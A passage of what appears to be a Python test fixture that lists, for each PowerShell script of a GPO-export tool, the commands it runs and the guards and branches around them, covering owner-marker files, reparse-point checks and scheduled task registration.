                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "catch []",
                "if ($zip) after []",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "finally",
                "if ($zip) after []",
            ),
        ),
        (
            "[guid]::NewGuid().ToString('N')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "[guid]::NewGuid()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "$newest.BaseName.Substring(0, $newest.BaseName.Length - 16)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                "[string]::Equals($_.BaseName.Substring(0, $_.BaseName.Length - 16), "
                "$producerPrefix, [StringComparison]::Ordinal)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$_.BaseName.Substring(0, $_.BaseName.Length - 16)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$lock.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "finally",
            ),
        ),
    ),
    "GpoLensCollectionMarker.ps1": (
        (
            "Get-Item -LiteralPath $Marker -Force -ErrorAction Stop",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                "if-condition after []",
            ),
        ),
        (
            (
                "Add-Type -TypeDefinition @' using System; using System.ComponentModel; using "
                "System.Runtime.InteropServices; using Microsoft.Win32.SafeHandles; namespace "
                "GpoLens { public static class MarkerFileInfo { "
                "[StructLayout(LayoutKind.Sequential)] private struct FileInfo { public uint "
                "Attributes; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "CreationTime; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "LastAccessTime; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "LastWriteTime; public uint VolumeSerialNumber; public uint FileSizeHigh; "
                "public uint FileSizeLow; public uint NumberOfLinks; public uint "
                'FileIndexHigh; public uint FileIndexLow; } [DllImport("kernel32.dll", '
                "SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static "
                "extern bool GetFileInformationByHandle(SafeFileHandle handle, out FileInfo "
                "info); public static uint LinkCount(SafeFileHandle handle) { FileInfo info; "
                "if (!GetFileInformationByHandle(handle, out info)) throw new "
                "Win32Exception(Marshal.GetLastWin32Error()); if ((info.Attributes & 0x400) != "
                '0) throw new InvalidOperationException("Collection refuses a linked owner '
                "marker.\"); return info.NumberOfLinks; } } } '@ -ErrorAction Stop"
            ),
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT) after []",
                "if (-not ('GpoLens.MarkerFileInfo' -as [type])) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $opened",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "if-condition after []",
            ),
        ),
        (
            "& stat -L --format=%h -- $opened 2>$null",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "guard if (-not (Test-Path -LiteralPath $opened)) -> throw",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force -ErrorAction Stop",
            ("function Write-GpoLensOwnerMarkerBytes",),
        ),
        (
            "Join-Path $root.FullName '.gpo-lens-collection-owner'",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
                "[IO.FileShare]::Read)"
            ),
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
            ),
        ),
        (
            "[GpoLens.MarkerFileInfo]::LinkCount($stream.SafeFileHandle)",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT) after []",
            ),
        ),
        (
            "$stream.SafeFileHandle.DangerousGetHandle().ToInt64()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
            ),
        ),
        (
            "$stream.SafeFileHandle.DangerousGetHandle()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
            ),
        ),
        (
            "[uint32]::TryParse([string]$count, [ref]$links)",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "guard if (-not (Test-Path -LiteralPath $opened)) -> throw",
                "if-condition after []",
            ),
        ),
        (
            "[IO.MemoryStream]::new()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
            ),
        ),
        (
            "$stream.CopyTo($bytes)",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "$bytes.ToArray()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "$bytes.Dispose()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "guard if ($links -ne 1) -> throw",
                "finally",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "finally",
            ),
        ),
        (
            "[IO.File]::Delete($marker)",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[IO.File]::Open($marker, [IO.FileMode]::CreateNew, [IO.FileAccess]::Write, "
                "[IO.FileShare]::None)"
            ),
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "$stream.Write($Bytes, 0, $Bytes.Length)",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "finally",
            ),
        ),
    ),
    "Register-GpoLensCollection.ps1": (
        (
            "Join-Path $PSScriptRoot 'Export-GpoEstate.ps1'",
            (),
        ),
        (
            ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            (),
        ),
        (
            "Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1'",
            (),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "function Set-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force",
            (
                "function Set-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Path $OutputRoot -Force",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Out-Null",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.lock'",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $marker",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
            ),
        ),
        (
            (
                "Write-Warning \"Changing output root owner from '$owner' to '$TaskName'; "
                "the previous task will refuse to run. Existing exports become subject to this "
                "task's retention.\""
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "if (Test-Path -LiteralPath $marker) after []",
                (
                    "if (-not [string]::Equals($owner, $TaskName, "
                    "[StringComparison]::OrdinalIgnoreCase)) after []"
                ),
                "guard if (-not $Force) -> throw",
            ),
        ),
        (
            (
                "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes "
                "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
            ),
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "& $RegisterTask",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "try",
            ),
        ),
        (
            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes $previousBytes",
            (
                "function Set-GpoLensCollectionOwner",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "try",
                "catch []",
                "if ($null -ne $previousBytes) after []",
            ),
        ),
        (
            "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if ($PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')) after []",
            ),
        ),
        (
            'Write-Host "Unregistered task: $TaskName (exports and logs retained)"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "if ($Unregister) after []",
                "if ($PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')) after []",
            ),
        ),
        (
            "Resolve-Path -LiteralPath $CollectorPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "Resolve-Path -LiteralPath (Join-Path $PSScriptRoot 'Run-GpoLensCollection.ps1')",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $PSScriptRoot 'Run-GpoLensCollection.ps1'",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $runner",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $CollectorPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $OutputRoot",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument $TaskName",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument (ConvertTo-GpoLensAbsolutePath $CopyTo)",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensAbsolutePath $CopyTo",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($CopyTo) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensTaskArgument (ConvertTo-GpoLensAbsolutePath $InventoryPath)",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "ConvertTo-GpoLensAbsolutePath $InventoryPath",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "New-ScheduledTaskPrincipal -UserId $account -LogonType Password -RunLevel Limited",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTaskAction -Execute "
                '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ` -Argument '
                "$taskArgs -WorkingDirectory $PSScriptRoot"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            "New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At $scheduleTime",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTaskSettingsSet -ExecutionTimeLimit $ExecutionTimeLimit ` "
                "-MultipleInstances IgnoreNew -StartWhenAvailable"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal "
                "-Settings $settings ` -Description 'Read-only GPO export, bounded retention, "
                "rotating logs and optional ZIP delivery.'"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
            ),
        ),
        (
            (
                "Get-Credential -UserName $ServiceAccount -Message 'Collection task "
                "credentials (saved only by Windows Task Scheduler)'"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "if (-not $GmsaAccount) after []",
                "if (-not $Credential) after []",
            ),
        ),
        (
            (
                "Set-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName "
                "-Force:$Force -RegisterTask { if ($GmsaAccount) { Register-ScheduledTask "
                "-TaskName $TaskName -InputObject $task -Force | Out-Null } else { "
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
                "$ServiceAccount -Password $taskPassword -Force | Out-Null } }"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
            ),
        ),
        (
            "Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "if ($GmsaAccount) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "if ($GmsaAccount) after []",
            ),
        ),
        (
            (
                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
                "$ServiceAccount -Password $taskPassword -Force"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "else of [($GmsaAccount)]",
            ),
        ),
        (
            "Out-Null",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
                ),
                (
                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
                    "return"
                ),
                "try",
                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
                "else of [($GmsaAccount)]",
            ),
        ),
        (
            'Write-Host "Registered task: $TaskName"',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "guard if ($Unregister) -> return",
                (
                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
